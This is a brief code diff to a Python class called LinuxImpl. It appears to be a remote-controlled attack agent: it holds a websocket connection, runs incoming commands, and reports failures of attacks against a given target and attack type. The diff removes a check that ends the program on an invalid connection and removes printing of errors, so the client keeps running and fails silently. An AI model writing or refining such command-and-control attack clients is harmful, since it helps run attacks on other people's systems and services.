@@ -94,11 +94,6 @@ class LinuxImpl:
             ) as ws:
                 self.retry_count = 0  
 
-                rec = await asyncio.wait_for(ws.recv(), timeout=60)
-
-                if "Invalid conection" in str(rec).strip():
-                    sys.exit(0)
-                
                 while self.running:
                     try:
                         await self._handle_commands(ws)
@@ -466,7 +461,6 @@ class LinuxImpl:
             else:
                 pass
         except Exception as e:
-            print(e)
             asyncio.run_coroutine_threadsafe(
                 self._notify_attack_error(ws, target, attack_type, str(e)),
                 loop
